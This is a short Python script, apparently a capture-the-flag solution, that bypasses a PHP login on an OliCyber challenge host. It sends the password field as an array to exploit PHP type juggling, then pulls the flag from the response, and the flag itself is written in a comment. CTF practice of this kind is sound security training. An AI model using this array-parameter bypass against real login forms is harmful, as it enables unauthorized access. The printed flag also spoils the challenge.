import requests
import re

url = "http://ennesimo_login_bypass.challs.olicyber.it/index.php"

r = requests.post(url, data={
    "password[]" : "random"
})
init_flag = "flag{.*}"
flag = re.findall(init_flag, r.text)

print(flag[0]) # flag{php_v3r510n_8_f1x3d_7h47_f347ur3}